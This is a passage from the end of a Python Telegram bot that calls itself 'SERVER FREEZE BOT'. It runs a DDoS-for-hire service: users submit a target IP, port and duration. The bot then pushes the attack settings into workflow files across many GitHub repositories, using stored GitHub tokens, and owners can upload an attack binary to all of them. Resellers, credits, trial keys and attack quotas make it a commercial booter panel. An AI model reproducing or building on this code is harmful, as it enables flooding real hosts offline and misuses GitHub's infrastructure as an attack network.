            reply_markup=get_back_keyboard()
        )
        return
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)
    status = "ENABLED" if MAINTENANCE_MODE else "DISABLED"
    await query.edit_message_text(
        f"🔧 MAINTENANCE MODE {status}\n\nBot is now {'under maintenance' if MAINTENANCE_MODE else 'available for all users'}.",
        reply_markup=get_back_keyboard()
    )

async def handle_broadcast_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_BROADCAST}
    await query.edit_message_text(
        "📢 BROADCAST MESSAGE\n\nPlease send the message to broadcast:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_owner_list(query, context):
    owners_list = "👑 OWNERS LIST\n\n"
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'owner_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        owners_list += f"• {owner_id} - @{username}"
        if is_primary:
            owners_list += " 👑"
        owners_list += "\n"
    await query.edit_message_text(
        owners_list,
        reply_markup=get_back_keyboard()
    )

async def handle_admin_list(query, context):
    if not admins:
        await query.edit_message_text(
            "📭 No admins",
            reply_markup=get_back_keyboard()
        )
        return
    admins_list = "🛡️ ADMINS LIST\n\n"
    for admin_id, admin_info in admins.items():
        username = admin_info.get('username', f'admin_{admin_id}')
        admins_list += f"• {admin_id} - @{username}\n"
    await query.edit_message_text(
        admins_list,
        reply_markup=get_back_keyboard()
    )

async def handle_reseller_list(query, context):
    if not resellers:
        await query.edit_message_text(
            "📭 No resellers",
            reply_markup=get_back_keyboard()
        )
        return
    resellers_list = "💰 RESELLERS LIST\n\n"
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'reseller_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        resellers_list += f"• {reseller_id} - @{username}\n  Credits: {credits}\n\n"
    await query.edit_message_text(
        resellers_list,
        reply_markup=get_back_keyboard()
    )

async def handle_add_owner_start(query, context):
    user_id = query.from_user.id
    if not is_primary_owner(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED\nOnly primary owners can add owners.",
            reply_markup=get_back_keyboard()
        )
        return
    user_states[user_id] = {"state": WAITING_FOR_OWNER_ID}
    await query.edit_message_text(
        "👑 ADD OWNER\n\nPlease enter Owner User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_add_reseller_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_RESELLER_ID}
    await query.edit_message_text(
        "💰 ADD RESELLER\n\nPlease enter Reseller User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_add_token_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_TOKEN}
    await query.edit_message_text(
        "➕ ADD TOKEN\n\nPlease send your GitHub token:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_view_tokens(query, context):
    if not github_tokens:
        await query.edit_message_text(
            "📭 No tokens added yet.",
            reply_markup=get_back_keyboard()
        )
        return
    tokens_list = "🔑 SERVERS LIST\n\n"
    for i, token_data in enumerate(github_tokens[:10], 1):
        tokens_list += f"{i}. 👤 {token_data['username']}\n   📁 {token_data['repo']}\n\n"
    tokens_list += f"📊 Total: {len(github_tokens)}"
    await query.edit_message_text(
        tokens_list,
        reply_markup=get_back_keyboard()
    )

async def handle_remove_token(query, context):
    if not github_tokens:
        await query.edit_message_text(
            "📭 No tokens to remove.",
            reply_markup=get_back_keyboard()
        )
        return
    await query.edit_message_text(
        f"🗑️ REMOVE TOKEN\n\nTotal tokens: {len(github_tokens)}\n\nSend token number to remove (1-{len(github_tokens)}):",
        reply_markup=get_cancel_keyboard()
    )

async def handle_remove_expired_tokens(query, context):
    valid_tokens = []
    expired_tokens = []
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            _ = user.login
            valid_tokens.append(token_data)
        except:
            expired_tokens.append(token_data)
    if not expired_tokens:
        await query.edit_message_text(
            "✅ All tokens are valid.",
            reply_markup=get_back_keyboard()
        )
        return
    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)
    await query.edit_message_text(
        f"🗑️ EXPIRED TOKENS REMOVED\n\nRemoved: {len(expired_tokens)}\nRemaining: {len(valid_tokens)}",
        reply_markup=get_back_keyboard()
    )

async def handle_upload_binary_start(query, context):
    user_id = query.from_user.id
    if not github_tokens:
        await query.edit_message_text(
            "❌ NO SERVERS AVAILABLE\nAdd tokens first.",
            reply_markup=get_back_keyboard()
        )
        return
    user_states[user_id] = {"state": WAITING_FOR_BINARY}
    await query.edit_message_text(
        "📤 UPLOAD BINARY\n\nPlease send your binary file...",
        reply_markup=get_cancel_keyboard()
    )

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global COOLDOWN_DURATION, MAX_ATTACKS
    user_id = update.effective_user.id
    text = update.message.text
    if user_id not in user_states or user_states[user_id] is None:
        return
    state_info = user_states[user_id]
    state = state_info.get("state")
    if state == WAITING_FOR_IP:
        if not is_valid_ip(text):
            await update.message.reply_text(
                "⚠️ INVALID IP\nIPs starting with '15' or '96' not allowed.\n\nPlease enter valid IP:",
                reply_markup=get_cancel_keyboard()
            )
            return
        method, method_name = get_attack_method(text)
        if method is None:
            await update.message.reply_text(
                f"⚠️ INVALID IP\n{method_name}\n\nPlease enter valid IP:",
                reply_markup=get_cancel_keyboard()
            )
            return
        state_info["ip"] = text
        state_info["method"] = method
        state_info["state"] = WAITING_FOR_PORT
        user_states[user_id] = state_info
        await update.message.reply_text(
            f"✅ IP Accepted: {text}\n\nPlease enter TARGET PORT:",
            reply_markup=get_cancel_keyboard()
        )
    elif state == WAITING_FOR_PORT:
        try:
            port = int(text)
            if port < 1 or port > 65535:
                await update.message.reply_text(
                    "⚠️ INVALID PORT\nPort must be between 1-65535.\n\nPlease enter valid PORT:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            state_info["port"] = text
            state_info["state"] = WAITING_FOR_TIME
            user_states[user_id] = state_info
            await update.message.reply_text(
                f"✅ Port Accepted: {text}\n\nPlease enter ATTACK TIME (seconds):",
                reply_markup=get_cancel_keyboard()
            )
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID PORT\nPort must be a number.\n\nPlease enter valid PORT:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_TIME:
        try:
            attack_duration = int(text)
            if attack_duration <= 0:
                await update.message.reply_text(
                    "⚠️ INVALID TIME\nTime must be positive.\n\nPlease enter valid TIME:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            ip = state_info["ip"]
            port = state_info["port"]
            method = state_info["method"]
            start_attack(ip, port, text, user_id, method)
            progress_msg = await update.message.reply_text("🔄 STARTING ATTACK...")
            success_count = 0
            threads = []
            results = []
            def update_single_token(token_data):
                try:
                    result = update_yml_file(token_data['token'], token_data['repo'], ip, port, text, method)
                    results.append((token_data['username'], result))
                except Exception as e:
                    results.append((token_data['username'], False))
            for token_data in github_tokens:
                thread = threading.Thread(target=update_single_token, args=(token_data,))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()
            for username, success in results:
                if success:
                    success_count += 1
            user_id_str = str(user_id)
            remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)
            message = f"🎯 ATTACK STARTED!\n\nTarget: {ip}:{port}\nTime: {text}s\nMethod: {method}\nServers: {success_count}\n\nRemaining: {remaining_attacks}/{MAX_ATTACKS}\nCooldown: {COOLDOWN_DURATION}s after"
            await progress_msg.edit_text(message, reply_markup=get_back_keyboard())
            user_states[user_id] = None
            def monitor_attack_completion():
                time.sleep(attack_duration)
                finish_attack()
            monitor_thread = threading.Thread(target=monitor_attack_completion)
            monitor_thread.daemon = True
            monitor_thread.start()
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID TIME\nTime must be a number.\n\nPlease enter valid TIME:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_USER_ID:
        try:
            new_user_id = int(text)
            state_info["user_id"] = new_user_id
            state_info["state"] = WAITING_FOR_DAYS
            user_states[user_id] = state_info
            await update.message.reply_text(
                f"✅ User ID: {new_user_id}\n\nPlease enter number of DAYS (0 for lifetime):",
                reply_markup=get_cancel_keyboard()
            )
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID USER ID\nMust be a number.\n\nPlease enter User ID:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_DAYS:
        try:
            days = int(text)
            new_user_id = state_info["user_id"]
            pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
            save_pending_users(pending_users)
            if days == 0:
                expiry = "LIFETIME"
            else:
                expiry = time.time() + (days * 24 * 60 * 60)
            approved_users[str(new_user_id)] = {
                "username": f"user_{new_user_id}",
                "added_by": user_id,
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "expiry": expiry,
                "days": days
            }
            save_approved_users(approved_users)
            try:
                await context.bot.send_message(
                    chat_id=new_user_id,
                    text=f"✅ ACCESS APPROVED!\n\nYour access has been approved for {days} days.\nUse /start to access the bot."
                )
            except:
                pass
            await update.message.reply_text(
                f"✅ USER ADDED\n\nUser ID: {new_user_id}\nDuration: {days} days\nAdded by: {user_id}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID DAYS\nMust be a number.\n\nPlease enter DAYS:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_REMOVE_ID:
        try:
            user_to_remove = int(text)
            user_to_remove_str = str(user_to_remove)
            removed = False
            if user_to_remove_str in approved_users:
                del approved_users[user_to_remove_str]
                save_approved_users(approved_users)
                removed = True
            pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
            save_pending_users(pending_users)
            if user_to_remove_str in user_attack_counts:
                del user_attack_counts[user_to_remove_str]
                save_user_attack_counts(user_attack_counts)
            if removed:
                await update.message.reply_text(
                    f"✅ USER REMOVED\n\nUser ID: {user_to_remove}",
                    reply_markup=get_back_keyboard()
                )
                try:
                    await context.bot.send_message(
                        chat_id=user_to_remove,
                        text="🚫 YOUR ACCESS HAS BEEN REMOVED\n\nYour access to the bot has been revoked."
                    )
                except:
                    pass
            else:
                await update.message.reply_text(
                    f"❌ USER NOT FOUND\n\nUser ID {user_to_remove} not found.",
                    reply_markup=get_back_keyboard()
                )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID USER ID\nMust be a number.\n\nPlease enter User ID:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_TRIAL_HOURS:
        try:
            hours = int(text)
            if hours < 1 or hours > 720:
                await update.message.reply_text(
                    "⚠️ INVALID HOURS\nMust be between 1-720.\n\nPlease enter HOURS:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            key = generate_trial_key(hours)
            await update.message.reply_text(
                f"🔑 TRIAL KEY GENERATED\n\nKey: {key}\nDuration: {hours} hours\n\nUsers can redeem with /redeem command.",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID HOURS\nMust be a number.\n\nPlease enter HOURS:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_COOLDOWN:
        try:
            new_cooldown = int(text)
            if new_cooldown < 10:
                await update.message.reply_text(
                    "⚠️ INVALID COOLDOWN\nMinimum 10 seconds.\n\nPlease enter COOLDOWN:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            COOLDOWN_DURATION = new_cooldown
            save_cooldown(new_cooldown)
            await update.message.reply_text(
                f"✅ COOLDOWN UPDATED\n\nNew cooldown: {COOLDOWN_DURATION}s",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID NUMBER\n\nPlease enter valid COOLDOWN:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_MAX_ATTACKS:
        try:
            max_attacks = int(text)
            if max_attacks < 1 or max_attacks > 1000:
                await update.message.reply_text(
                    "⚠️ INVALID NUMBER\nMust be 1-1000.\n\nPlease enter MAX ATTACKS:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            MAX_ATTACKS = max_attacks
            save_max_attacks(max_attacks)
            await update.message.reply_text(
                f"✅ MAX ATTACKS UPDATED\n\nNew limit: {MAX_ATTACKS}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ INVALID NUMBER\n\nPlease enter valid MAX ATTACKS:",
                reply_markup=get_cancel_keyboard()
            )
    elif state == WAITING_FOR_BROADCAST:
        all_users = set()
        for uid in approved_users.keys():
            all_users.add(int(uid))
        for uid in resellers.keys():
            all_users.add(int(uid))
        for uid in admins.keys():
            all_users.add(int(uid))
        for uid in owners.keys():
            all_users.add(int(uid))
        total_users = len(all_users)
        success_count = 0
        progress_msg = await update.message.reply_text(
            f"📢 SENDING BROADCAST...\n\nTotal users: {total_users}"
        )
        for uid in all_users:
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=f"📢 BROADCAST\n\n{text}"
                )
                success_count += 1
                time.sleep(0.1)
            except:
                pass
        await progress_msg.edit_text(
            f"✅ BROADCAST COMPLETED\n\n✅ Successful: {success_count}\n❌ Failed: {total_users - success_count}\n📊 Total: {total_users}",
            reply_markup=get_back_keyboard()
        )
        user_states[user_id] = None
    elif state == WAITING_FOR_TOKEN:
        token = text.strip()
        repo_name = "soulcrack-tg"
        try:
            for existing_token in github_tokens:
                if existing_token['token'] == token:
                    await update.message.reply_text(
                        "❌ Token already exists.",
                        reply_markup=get_back_keyboard()
                    )
                    user_states[user_id] = None
                    return
            g = Github(token)
            user = g.get_user()
            username = user.login
            repo, created = create_repository(token, repo_name)
            new_token_data = {
                'token': token,
                'username': username,
                'repo': f"{username}/{repo_name}",
                'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'active'
            }
            github_tokens.append(new_token_data)
            save_github_tokens(github_tokens)
            await update.message.reply_text(
                f"✅ TOKEN ADDED!\n\nUsername: {username}\nRepo: {repo_name}\nTotal: {len(github_tokens)}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except Exception as e:
            await update.message.reply_text(
                f"❌ ERROR\n\n{str(e)}\n\nPlease check the token.",
                reply_markup=get_cancel_keyboard()
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_states or user_states[user_id] is None:
        return
    state_info = user_states[user_id]
    state = state_info.get("state")
    if state == WAITING_FOR_BINARY:
        if not is_owner(user_id):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            user_states[user_id] = None
            return
        progress_msg = await update.message.reply_text("📥 DOWNLOADING BINARY FILE...")
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_binary_{user_id}.bin"
            await file.download_to_drive(file_path)
            with open(file_path, 'rb') as f:
                binary_content = f.read()
            file_size = len(binary_content)
            await progress_msg.edit_text(
                f"📊 FILE DOWNLOADED: {file_size} bytes\n\n📤 Uploading to servers..."
            )
            success_count = 0
            results = []
            def upload_to_repo(token_data):
                try:
                    g = Github(token_data['token'])
                    repo = g.get_repo(token_data['repo'])
                    try:
                        existing_file = repo.get_contents(BINARY_FILE_NAME)
                        repo.update_file(
                            BINARY_FILE_NAME,
                            "Update binary file",
                            binary_content,
                            existing_file.sha,
                            branch="main"
                        )
                        results.append((token_data['username'], True))
                    except:
                        repo.create_file(
                            BINARY_FILE_NAME,
                            "Upload binary file",
                            binary_content,
                            branch="main"
                        )
                        results.append((token_data['username'], True))
                except Exception as e:
                    results.append((token_data['username'], False))
            threads = []
            for token_data in github_tokens:
                thread = threading.Thread(target=upload_to_repo, args=(token_data,))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()
            for username, success in results:
                if success:
                    success_count += 1
            os.remove(file_path)
            await progress_msg.edit_text(
                f"✅ BINARY UPLOAD COMPLETED!\n\n✅ Successful: {success_count}\n❌ Failed: {len(github_tokens) - success_count}\n📊 Total: {len(github_tokens)}\n\n📁 FILE: {BINARY_FILE_NAME}\n📦 SIZE: {file_size} bytes",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except Exception as e:
            await progress_msg.edit_text(
                f"❌ ERROR\n\n{str(e)}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("🤖 SERVER FREEZE BOT IS RUNNING...")
    print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 Secondary owners: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
    print(f"📊 Approved users: {len(approved_users)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max attacks: {MAX_ATTACKS}")
    application.run_polling()

if __name__ == '__main__':
    main()
